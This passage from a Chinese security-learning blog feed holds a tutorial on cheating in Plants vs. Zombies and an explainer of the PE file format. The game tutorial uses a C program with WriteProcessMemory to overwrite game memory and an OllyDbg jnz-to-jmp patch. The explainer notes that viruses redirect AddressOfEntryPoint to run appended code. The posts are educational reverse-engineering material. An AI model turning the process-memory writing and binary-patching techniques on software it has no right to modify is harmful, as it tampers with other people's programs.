></tr><tr><td>SYNCHRONIZE</td><td>使用wait()函数等待进程终止</td></tr></tbody></table></div><ul><li>通过<code>WriteProcessMemory()</code>函数写入某一进程的内存区域。注意，直接写入会出现“Access Violation”错误，故需此函数入口区必须可以访问，否则操作失败。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">WriteProcessMemory</span><span class="params">(</span></span><br><span class="line"><span class="params">HANDLE hProcess,                 <span class="comment">//由OpenProcess返回的进程句柄</span></span></span><br><span class="line"><span class="params">LPVOID lpBaseAddress,            <span class="comment">//要写入的内存首地址</span></span></span><br><span class="line"><span class="params">LPVOID lpBuffer,                 <span class="comment">//指向数据当前存放的地址</span></span></span><br><span class="line"><span class="params">DWORD nSize,                     <span class="comment">//数据的长度</span></span></span><br><span class="line"><span class="params">LPDWORD lpNumberOfBytesWritten</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>完整代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//输入值作为修改阳光参数</span></span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line"></span><br><span class="line"><span class="comment">//进程ID</span></span><br><span class="line">DWORD pid;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.找到游戏窗口 窗口类型、窗口标题</span></span><br><span class="line">HWND hwnd = FindWindow(<span class="literal">NULL</span>, <span class="string">L&quot;Plants vs. Zombies 1.2.0.1073 RELEASE&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.通过窗口找到进程ID</span></span><br><span class="line">GetWindowThreadProcessId(hwnd, &amp;pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.通过进程id打开进程</span></span><br><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.通过打开进程修改游戏内容</span></span><br><span class="line">WriteProcessMemory(hProcess, (LPVOID)<span class="number">0x25B42938</span>, (LPVOID)&amp;x, <span class="keyword">sizeof</span>(x), &amp;pid);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>芜湖实现阳光自由了~</p><img src="/posts/8ba499c5/5.1.5.png" class="" title="CE查找存储阳光值的地址"><p>经多次实验发现，每次存储阳光值的地址都不同，所以每次都需要用CE找到其地址再进行修改。</p><p>注意，如果游戏存在地址保护的情况，可以尝试注入进行修改。(我还没到那种水平，遇到再说)</p><h2 id="5-2-OD逆向自动拾取阳光"><a href="#5-2-OD逆向自动拾取阳光" class="headerlink" title="5.2 OD逆向自动拾取阳光"></a>5.2 OD逆向自动拾取阳光</h2><p>拾取阳光的关键是点击鼠标，点击到阳光，阳光值会增加。所以我们希望在阳光出现的时候触发点击阳光事件，初步预测涉及两个call：</p><ul><li>阳光出现call</li><li>判断是否点击到阳光然后增加阳光值call</li></ul><p>使用CE定位阳光值地址，选中该地址右键 -&gt; 找出是什么改写了这个地址。当再次拾取阳光时，阳光值从75变到了100，同时CE的小窗口出现了一条记录。</p><img src="/posts/8ba499c5/5.2.1.png" class="" title="OD逆向自动拾取阳光"><p>选中这条记录，下面会出现相关的汇编指令和当前寄存器的值。eax寄存器存的就是每次拾取阳光增加的数值25。</p><img src="/posts/8ba499c5/5.2.2.png" class="" title="OD逆向自动拾取阳光"><p>CE的工作到这里就结束了，接下来将游戏载入OD，定位到<code>0043A7F5</code>处，下断运行。当鼠标点击拾取阳光后，程序停在断点处。</p><img src="/posts/8ba499c5/5.2.3.png" class="" title="OD逆向自动拾取阳光"><p>在查看上面的一连串跳转指令中，发现有个jnz跳过了“增加阳光值”的操作。但给它下断运行，捡了几次阳光，都没有经过这个跳转指令，所以暂时先不管它。</p><img src="/posts/8ba499c5/5.2.5.png" class="" title="OD逆向自动拾取阳光"><p>往上拉拉发现<code>0043A7F5</code>所在的函数的功能仅仅是改变数据段中的阳光值。Ctrl + F9 执行到返回，F7 去到它的上一层函数。发现这个jnz指令有可能会绕过增加阳光值call，给它下个断点，运行几次。</p><img src="/posts/8ba499c5/5.2.4.png" class="" title="OD逆向自动拾取阳光"><p>发现阳光每往左上方移一段路程就要经过这个jnz指令，直到阳光到达指定位置才进入增加阳光值的call。</p><img src="/posts/8ba499c5/5.2.6.png" class="" title="OD逆向自动拾取阳光"><p>那这个jnz指令可以不管它，把它的断点取消。继续返回到父函数，看到有一个jnz指令可以跳到增加阳光call，下断运行。(那些call + jmp指令我们基本不会去动的，否则很容易导致程序运行出错)</p><img src="/posts/8ba499c5/5.2.7.png" class="" title="OD逆向自动拾取阳光"><p>此时阳光已经出现了，但jnz跳转没有实现，也就是还不能进入增加阳光call。</p><img src="/posts/8ba499c5/5.2.8.png" class="" title="OD逆向自动拾取阳光"><p>那怎样才能进入呢？对玩家来说，肯定是要用鼠标点击阳光才能增加阳光值。也就是触发鼠标点击阳光事件才能让jnz跳转指令实现。那我们要实现自动拾取功能，也就是鼠标不点击阳光也能使阳光值增加，怎么办？让这个jnz指令失去它的判断功能，改为无条件跳转指令jmp。</p><p>然后就会发现阳光一出现就被迅速移到指定位置，增加阳光值啦~</p><p>(注意，新手教程一定要点击一下阳光才能继续游戏)</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;现在就要跟随 &lt;a href=&quot;https://blog.csdn.net/Eastmount&quot;&gt;Eastmount&lt;/a&gt; 老师学习系统安全与恶意代码分析了，是的，终于要真正的系统地学习了~加油小凉！&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向分析" scheme="http://example.com/tags/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
    <category term="恶意代码分析" scheme="http://example.com/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
    <category term="系统安全" scheme="http://example.com/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PE结构</title>
    <link href="http://example.com/posts/4dec66bb.html"/>
    <id>http://example.com/posts/4dec66bb.html</id>
    <published>2022-05-17T06:31:06.671Z</published>
    <updated>2022-05-20T07:47:14.309Z</updated>
    
    <content type="html"><![CDATA[<p>Windows逆向最基础的就是要对PE结构烂熟于心，我之前做了很多题又怎样呢，还是对PE结构一知半解，地基打不好就别梦想盖高楼。知其然知其所以然，千万不要图“快”而忽略一些重要的细节，慢就是快，这也是我这段时间悟出来的道理。</p><span id="more"></span><h1 id="1-PE的基本概念"><a href="#1-PE的基本概念" class="headerlink" title="1. PE的基本概念"></a>1. PE的基本概念</h1><p>EXE和DLL文件之间的区别完全是语义上的，因为它们使用的是完全相同的PE格式，而唯一的区别就是用一个字段标识出这个文件是EXE还是DLL。</p><p>64位Windows只是对PE格式做了一些简单的修饰，格式为PE32+，并没有任何新的结构加进去，改变的只是将32位字段扩展为64位。</p><p>PE格式的定义主要位于头文件<code>winnt.h</code>，这个头文件几乎能找到关于PE文件的所有定义。</p><p>PE文件中的数据结构一般都有32位和64位之分，一般名称上会表现出来，例如：<code>IMAGE_NT_HEADERS32</code>或<code>IMAGE_NT_HEADER64</code>。</p><img src="/posts/4dec66bb/PE%E6%96%87%E4%BB%B6%E6%A1%86%E6%9E%B6%E7%BB%93%E6%9E%84.jpg" class="" title="PE文件框架结构"><p>PE文件使用的是一个平面地址空间，所有代码和数据都合并在一起，组成一个很大的结构。文件的内容被分割为不同的区块，块中包含代码或数据。各个区块按页边界来对齐，区块没有大小限制，是一个连续的结构。此外，每个块有自己在内存中的一套属性，比如区块是否包含代码、是否只读或可读可写等。</p><p>PE文件不是作为单一内存映射文件被装入内存的。Windows加载器(又称PE装载器)遍历PE文件并决定文件的哪一部分被映射，这种映射方式是将文件较高的偏移位置映射到较高的内存地址中。当磁盘文件一旦被装入内存中，磁盘上的数据结构布局和内存中的数据结构布局是一致的。但数据之间的相对位置可能改变，其某项偏移地址可能不同于原始的偏移地址。</p><img src="/posts/4dec66bb/PE%E6%96%87%E4%BB%B6%E6%A1%86%E6%9E%B6%E7%BB%93%E6%9E%84%E5%9B%BE.png" class="" title="PE文件框架结构图"><p>由上图可以看出，文件被映射到内存，DOS文件头、PE文件头、区块表的偏移位置和大小都没有发生改变。而各区块映射到内存后，其偏移位置发生了改变。</p><p>当PE文件被Windows加载器加载到内存后，内存中的PE文件称之为模块(module)。映射文件的起始地址被称之为模块的句柄(handle)。</p><p>在Windows NT中，获取了模块的句柄相当于获取了基地址，获取了基地址相当于获取了PE结构的文件头。</p><ul><li>基地址(ImageBase)：整个PE结构中的头地址，也就是模块的句柄。可用<code>HMODULE GetModuleHandle(LPCTSTR lpModuleName);</code>去获取模块的句柄。</li><li>文件偏移地址(File Offset Address)：当PE文件存放在磁盘中，各个区块对于文件头的相对偏移地址，文件头的起始地址从0开始。</li><li>虚拟地址(Virtual Address)：PE文件映射到内存中会发生比例的变化，导致与在磁盘中的地址不一致，这个内存中的地址就是虚拟地址。</li><li>相对虚拟地址(Relative Virtual Address)：相对于基地址的偏移。</li></ul><h1 id="2-MS-DOS头部"><a href="#2-MS-DOS头部" class="headerlink" title="2. MS-DOS头部"></a>2. MS-DOS头部</h1><p>每个PE文件是以一个DOS程序开始的，有了它，一旦程序在DOS下执行，DOS才能识别出这是有效的执行体。</p><p>PE文件的第一个字节起始于一个传统的MS-DOS头部，被称作<code>IMAGE_DOS_HEADER</code>。</p><h2 id="2-1-IMAGE-DOS-HEADER"><a href="#2-1-IMAGE-DOS-HEADER" class="headerlink" title="2.1 IMAGE_DOS_HEADER"></a>2.1 IMAGE_DOS_HEADER</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DOS_HEADER STRUCT </span><br><span class="line">&#123; </span><br><span class="line">    +<span class="number">00</span>h WORD e_magic      <span class="comment">// Magic DOS signature MZ(4Dh 5Ah)  DOS可执行文件标志</span></span><br><span class="line">    +<span class="number">02</span>h WORD e_cblp      <span class="comment">// Bytes on last page of file   </span></span><br><span class="line">    +<span class="number">04</span>h WORD e_cp       <span class="comment">// Pages in file</span></span><br><span class="line">    +<span class="number">06</span>h WORD e_crlc       <span class="comment">// Relocations</span></span><br><span class="line">    +<span class="number">08</span>h WORD e_cparhdr    <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    +<span class="number">0</span>ah WORD e_minalloc   <span class="comment">// Minimun extra paragraphs needs</span></span><br><span class="line">    +<span class="number">0</span>ch WORD e_maxalloc <span class="comment">// Maximun extra paragraphs needs</span></span><br><span class="line">    +<span class="number">0</span>eh WORD e_ss         <span class="comment">// intial(relative)SS value     DOS代码的初始化堆栈SS </span></span><br><span class="line">    +<span class="number">10</span>h WORD e_sp         <span class="comment">// intial SP value     DOS代码的初始化堆栈指针SP </span></span><br><span class="line">    +<span class="number">12</span>h WORD e_csum       <span class="comment">// Checksum </span></span><br><span class="line">    +<span class="number">14</span>h WORD e_ip        <span class="comment">// intial IP value  DOS代码的初始化指令入口[指针IP] </span></span><br><span class="line">    +<span class="number">16</span>h WORD e_cs         <span class="comment">// intial(relative)CS value    DOS代码的初始堆栈入口 </span></span><br><span class="line">    +<span class="number">18</span>h WORD e_lfarlc     <span class="comment">// File Address of relocation table </span></span><br><span class="line">    +<span class="number">1</span>ah WORD e_ovno      <span class="comment">//   Overlay number </span></span><br><span class="line">    +<span class="number">1</span>ch WORD e_res[<span class="number">4</span>]     <span class="comment">// Reserved words </span></span><br><span class="line">    +<span class="number">24</span>h WORD e_oemid      <span class="comment">//   OEM identifier(for e_oeminfo) </span></span><br><span class="line">    +<span class="number">26</span>h WORD e_oeminfo   <span class="comment">//  OEM information;e_oemid specific  </span></span><br><span class="line">    +<span class="number">29</span>h WORD e_res2[<span class="number">10</span>]   <span class="comment">//  Reserved words </span></span><br><span class="line">    +<span class="number">3</span>ch DWORD e_lfanew    <span class="comment">// Offset to start of PE header  指向PE文件头</span></span><br><span class="line">&#125;IMAGE_DOS_HEADER ENDS</span><br></pre></td></tr></table></figure><p>两个重要字段：</p><ul><li>e_magic：必须为MZ(4D 5A)开头，大小为2个字节。</li><li>e_lfanew：PE文件头的起始偏移地址，大小为4个字节。</li></ul><p>DOS头后跟一个DOS stub数据，是链接器链接执行文件的时候加入的部分数据，一般是“This program must be run under Microsoft Windows”。这个可以通过修改链接器的设置来修改成自己定义的数据。</p><h1 id="3-PE文件头"><a href="#3-PE文件头" class="headerlink" title="3. PE文件头"></a>3. PE文件头</h1><p>紧跟着DOS stub的是PE头文件(PE Header)。PE Header是PE相关结构NT映像头(<code>IMAGE_NT_HEADER</code>)的简称，其中包含许多PE装载器用到的重要字段。执行体在支持PE文件结构的操作系统中执行时，PE装载器将从<code>IMAGE_DOS_HEADER</code>结构中的<code>e_lfanew</code>字段里找到PE Header的起始偏移量，加上基地址得到PE文件头的指针。</p><script type="math/tex; mode=display">PNTHeader = ImageBase + (dosHeader\to e\_lfanew)</script><p>PE头的数据结构被定义为<code>IMAGE_NT_HEADERS</code>。</p><h2 id="3-1-IMAGE-NT-HEADERS"><a href="#3-1-IMAGE-NT-HEADERS" class="headerlink" title="3.1 IMAGE_NT_HEADERS"></a>3.1 IMAGE_NT_HEADERS</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_NT_HEADERS STRUCT</span><br><span class="line">&#123;</span><br><span class="line">  +<span class="number">0</span>h     DWORD Signature</span><br><span class="line">  +<span class="number">4</span>h     IMAGE_FILE_HEADER FileHeader</span><br><span class="line">  +<span class="number">18</span>h    IMAGE_OPTIONAL_HEADER32 OptionalHeader</span><br><span class="line">&#125;IMAGE_NT_HEADERS ENDS</span><br></pre></td></tr></table></figure><ul><li>Signature：在一个有效的PE文件里，被设置为00004550h，也就是“PE..”，标志这是PE文件头的开始。</li><li>FileHeader：映像头文件结构包含了文件的物理层信息及文件属性，占20字节。</li><li>OptionalHeader：可选映像头是一个可选的结构，实际上<code>IMAGE_FILE_HEADER</code>结构不足以定义PE文件属性，因此可选映像头中定义了更多的数据。总共224个字节，最后128个字节为数据目录(Data Directory)。</li></ul><h2 id="3-2-IMAGE-FILE-HEADER"><a href="#3-2-IMAGE-FILE-HEADER" class="headerlink" title="3.2 IMAGE_FILE_HEADER"></a>3.2 IMAGE_FILE_HEADER</h2><p>从“+4h”开始是相对于<code>IMAGE_NT_HEADERS</code>结构中的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">  +<span class="number">4</span>h   WORD    Machine;<span class="comment">//运行平台</span></span><br><span class="line">  +<span class="number">6</span>h   WORD    NumberOfSections;<span class="comment">//文件的区块数目</span></span><br><span class="line">  +<span class="number">8</span>h   DWORD   TimeDateStamp;<span class="comment">//文件创建日期和时间</span></span><br><span class="line">  +<span class="number">0</span>Ch  DWORD   PointerToSymbolTable;<span class="comment">//指向符号表（用于调试）</span></span><br><span class="line">  +<span class="number">10</span>h  DWORD   NumberOfSymbols;<span class="comment">//符号表中符号个数（用于调试）</span></span><br><span class="line">  +<span class="number">14</span>h  WORD    SizeOfOptionalHeader;<span class="comment">//IMAGE_OPTIONAL_HEADER32结构大小</span></span><br><span class="line">  +<span class="number">16</span>h  WORD    Characteristics;<span class="comment">//文件属性</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><ul><li><p>Machine：可执行文件的目标CPU类型。</p><p>| Value                                | Meaning       |<br>| —————————————————— | ——————- |<br>| IMAGE_FILE_MACHINE_I386<br />0x014c  | x86           |<br>| IMAGE_FILE_MACHINE_IA64<br />0x0200  | Intel Itanium |<br>| IMAGE_FILE_MACHINE_AMD64<br />0x8664 | x64           |</p></li><li><p>NumberOfSections：区块的数目。(区块表是紧跟在<code>IMAGE_NT_HEADERS</code>后面的)</p></li><li><p>TimeDataStamp：表明文件是何时被创建的。这个值是自1970-1-1以来用格林威治时间计算的秒数。</p></li><li><p>PointerToSymbolTable：COFF符号表的文件偏移位置，现在基本没用了。</p></li><li><p>NumberOfSymbols：如果有COFF符号表，它代表其中的符号数目，COFF符号是一个大小固定的结构，如果想找到COFF符号表的结束位置，则需要这个变量。</p></li><li><p>SizeOfOptionalHeader：紧跟着<code>IMAGE_FILE_HEADER</code>后面的数据结构(<code>IMAGE_OPTIONAL_HEADER</code>)的大小。对于32位PE文件，这个值通常为00E0h，对于64位，值为00F0h。</p></li><li><p>Characteristics：文件属性，有选择地通过几个值可以运算得到。这些标志的有效值是定义于<code>winnt.h</code>内的<code>IMAGE_FILE_xxx</code>的值，具体含义见下表。普通EXE文件的字段值一般为0100h，DLL文件值为210Eh。多种属性可通过“或运算”同时拥有。</p><p>| Value                                         | Meaning                                                      |<br>| ——————————————————————- | —————————————————————————————— |<br>| IMAGE_FILE_RELOCS_STRIPPED<br/>0x0001         | Relocation information was stripped from the file. The file must be loaded at its preferredbase address. If the base address is notavailable, the loader reports an error. |<br>| IMAGE_FILE_EXECUTABLE_IMAGE<br/>0x0002        | The file is executable (there are no unresolved external references). |<br>| IMAGE_FILE_LINE_NUMS_STRIPPED<br/>0x0004      | COFF line numbers were stripped from the file.               |<br>| IMAGE_FILE_LOCAL_SYMS_STRIPPED<br/>0x0008     | COFF symbol table entries were stripped from file.           |<br>| IMAGE_FILE_AGGRESIVE_WS_TRIM<br/>0x0010       | Aggressively trim the working set. This value is obsolete as of Windows 2000. |<br>| IMAGE_FILE_LARGE_ADDRESS_AWARE<br/>0x0020     | The application can handle addresses larger than 2 GB.       |<br>| IMAGE_FILE_BYTES_REVERSED_LO<br/>0x0080       | The bytes of the word are reversed. This flag is obsolete.   |<br>| IMAGE_FILE_32BIT_MACHINE<br/>0x0100           | The computer supports 32-bit words.                          |<br>| IMAGE_FILE_DEBUG_STRIPPED<br/>0x0200          | Debugging information was removed and stored separately in another file. |<br>| IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP<br/>0x0400 | If the image is on removable media, copy it toand run it from the swap file. |<br>| IMAGE_FILE_NET_RUN_FROM_SWAP<br/>0x0800       | If the image is on the network, copy it to and run it from the swap file. |<br>| IMAGE_FILE_SYSTEM<br/>0x1000                  | The image is a system file.                                  |<br>| IMAGE_FILE_DLL<br/>0x2000                     | The image is a DLL file. While it is an executable file, it cannot be run directly. |<br>| IMAGE_FILE_UP_SYSTEM_ONLY<br/>0x4000          | The file should be run only on a uniprocessor computer.      |<br>| IMAGE_FILE_BYTES_REVERSED_HI<br/>0x8000       | The bytes of the word are reversed. This flag is obsolete.   |</p></li></ul><h2 id="3-3-IMAGE-OPTIONAL-HEADER32"><a href="#3-3-IMAGE-OPTIONAL-HEADER32" class="headerlink" title="3.3 IMAGE_OPTIONAL_HEADER32"></a>3.3 IMAGE_OPTIONAL_HEADER32</h2><p>从“+18h”是相对于<code>IMAGE_NT_HEADERS</code>结构中的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">  +<span class="number">18</span>h  WORD    Magic;<span class="comment">//标志字</span></span><br><span class="line">  +<span class="number">1</span>Ah  BYTE    MajorLinkerVersion;<span class="comment">//链接器主版本号</span></span><br><span class="line">  +<span class="number">1B</span>h  BYTE    MinorLinkerVersion;<span class="comment">//链接器次版本号</span></span><br><span class="line">  +<span class="number">1</span>Ch  DWORD   SizeOfCode;<span class="comment">//所有含有代码表的总大小</span></span><br><span class="line">  +<span class="number">20</span>h  DWORD   SizeOfInitializedData;<span class="comment">//所有初始化数据表总大小</span></span><br><span class="line">  +<span class="number">24</span>h  DWORD   SizeOfUninitializedData;<span class="comment">//所有未初始化数据表总大小</span></span><br><span class="line">  +<span class="number">28</span>h  DWORD   AddressOfEntryPoint;<span class="comment">//程序执行入口RVA【重要】</span></span><br><span class="line">  +<span class="number">2</span>Ch  DWORD   BaseOfCode;<span class="comment">//代码表起始RVA</span></span><br><span class="line">  +<span class="number">30</span>h  DWORD   BaseOfData;<span class="comment">//数据表起始RVA</span></span><br><span class="line">    <span class="comment">//以下属于NT结构增加的领域</span></span><br><span class="line">  +<span class="number">34</span>h  DWORD   ImageBase;<span class="comment">//程序默认装入基地址【重要】</span></span><br><span class="line">  +<span class="number">38</span>h  DWORD   SectionAlignment;<span class="comment">//内存中表的对齐大小【重要】</span></span><br><span class="line">  +<span class="number">3</span>Ch  DWORD   FileAlignment;<span class="comment">//文件中表的对齐大小【重要】</span></span><br><span class="line">  +<span class="number">40</span>h  WORD    MajorOperatingSystemVersion;<span class="comment">//操作系统主版本号</span></span><br><span class="line">  +<span class="number">42</span>h  WORD    MinorOperatingSystemVersion;<span class="comment">//操作系统次版本号</span></span><br><span class="line">  +<span class="number">44</span>h  WORD    MajorImageVersion;<span class="comment">//用户自定义主版本号</span></span><br><span class="line">  +<span class="number">46</span>h  WORD    MinorImageVersion;<span class="comment">//用户自定义次版本号</span></span><br><span class="line">  +<span class="number">48</span>h  WORD    MajorSubsystemVersion;<span class="comment">//所需要子系统主版本号</span></span><br><span class="line">  +<span class="number">4</span>Ah  WORD    MinorSubsystemVersion;<span class="comment">//所需要子系统次版本号</span></span><br><span class="line">  +<span class="number">4</span>Ch  DWORD   Win32VersionValue;<span class="comment">//保留，通常设置为0</span></span><br><span class="line">  +<span class="number">50</span>h  DWORD   SizeOfImage;<span class="comment">//映像装入内存后的总大小</span></span><br><span class="line">  +<span class="number">54</span>h  DWORD   SizeOfHeaders;<span class="comment">//DOS头、PE头、区块表总大小</span></span><br><span class="line">  +<span class="number">58</span>h  DWORD   CheckSum;<span class="comment">//映像校验和</span></span><br><span class="line">  +<span class="number">5</span>Ch  WORD    Subsystem;<span class="comment">//可执行文件期望的子系统【重要】</span></span><br><span class="line">  +<span class="number">5</span>Eh  WORD    DllCharacteristics;<span class="comment">//显示DLL特性的旗标</span></span><br><span class="line">  +<span class="number">60</span>h  DWORD   SizeOfStackReserve;<span class="comment">//初始化堆栈大小</span></span><br><span class="line">  +<span class="number">64</span>h  DWORD   SizeOfStackCommit;<span class="comment">//初始化实际提交堆栈大小</span></span><br><span class="line">  +<span class="number">68</span>h  DWORD   SizeOfHeapReserve;<span class="comment">//初始化保留堆栈大小</span></span><br><span class="line">  +<span class="number">6</span>Ch  DWORD   SizeOfHeapCommit;<span class="comment">//初始化实际保留堆栈大小</span></span><br><span class="line">  +<span class="number">70</span>h  DWORD   LoaderFlags;<span class="comment">//与调试相关，默认值为0</span></span><br><span class="line">  +<span class="number">74</span>h  DWORD   NumberOfRvaAndSizes;<span class="comment">//数据目录表的项数(总是16)</span></span><br><span class="line">  +<span class="number">78</span>h  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];<span class="comment">//数据目录表【重要】</span></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><p>事实上，这个结构中的大部分字段都不重要，但有些病毒恰恰利用这些字段做手脚。</p><ul><li><p>AddressOfEntryPoint：指出文件被执行时的入口地址，这是一个RVA地址。如果在一个可执行文件上附加了一段代码并想让这段代码首先被执行，那么只需要将这个入口地址指向附加的代码即可。</p></li><li><p>ImageBase：指出文件的优先装入地址。文件被执行时，如果可能的话，Windows优先将文件装入到由<code>ImageBase</code>字段指定的地址中，只有指定的地址已经被其它模块使用时，文件才被装入到其它地址中。链接器产生可执行文件的时候对应这个地址来生成机器码，所以当文件被装入这个地址时不需要进行重定位操作，装入的速度最快，如果文件被装载到其它地址的话，将不得不进行重定位操作，这样就要慢一点。</p><p>对于EXE文件来说，由于每个文件总是使用独立的虚拟地址空间，优先装入地址不可能被其它模块占据，所以EXE总是能够按照这个地址装入，这也意味着EXE文件不再需要重定位信息。</p><p>对于DLL文件来说，由于多个DLL文件全部使用宿主EXE文件的地址空间，不能保证优先装入地址没有被其它的DLL使用，所以DLL文件中必须包含重定位信息以防万一。因此，在前面介绍的<code>IMAGE_FILE_HEADER</code>结构的<code>Characteristics</code>字段中，DLL文件对应的<code>IMAGE_FILE_RELOCS_STRIPPED</code>位总是为0，而EXE文件的这个标志位总是为1。</p><p>在链接的时候，可以通过对<code>link.exe</code>指定<code>/base:address</code>选项来自定义优先装入地址，如果不指定这个选项的话，一般EXE文件的默认优先装入地址被定为00400000h，而DLL文件的默认优先装入地址被定为10000000h。</p></li><li><p>SectionAlignment和FileAlignment：<code>SectionAlignment</code>字段指定了节被装入内存后的对齐单位。也就是说，每个节被装入的地址必定是本字段指定数值的整数倍。在内存中对齐默认以1000h为单位。而<code>FileAlignment</code>字段指定了节存储在磁盘文件中时的对齐单位。在磁盘中对齐默认以200h为单位。</p><p>在64位下内存对齐以2000h为单位，如果32位程序想在64位系统下实现兼容，将<code>SectionAlignment</code>值设为2000h即可。</p></li><li><p>Subsystem：指定使用界面的子系统，它的取值如下表所示。这个字段决定了系统如何为程序建立初始的界面，链接时的<code>/subsystem:xxx</code>选项指定的就是这个字段的值。如果将子系统指定为Windows CUI，那么系统会自动为程序建立一个控制台窗口，而指定为Windows GUI的话，窗口必须由程序自己建立。</p><p>| 取值 | Windows.inc中的预定义值        | 含义                       |<br>| —— | ——————————————— | ————————————— |<br>| 0    | IMAGE_SUBSYSTEM_UNKNOWN        | 未知的子系统               |<br>| 1    | IMAGE_SUBSYSTEM_NATIVE         | 不需要子系统（如驱动程序） |<br>| 2    | IMAGE_SUBSYSTEM_WINDOWS_GUI    | Windows图形界面            |<br>| 3    | IMAGE_SUBSYSTEM_WINDOWS_CUI    | Windows控制台界面          |<br>| 5    | IMAGE_SUBSYSTEM_OS2_CUI        | OS2控制台界面              |<br>| 7    | IMAGE_SUBSYSTEM_POSIX_CUI      | POSIX控制台界面            |<br>| 8    | IMAGE_SUBSYSTEM_NATIVE_WINDOWS | 不需要子系统               |<br>| 9    | IMAGE_SUBSYSTEM_WINDOWS_CE_GUI | Windows CE图形界面         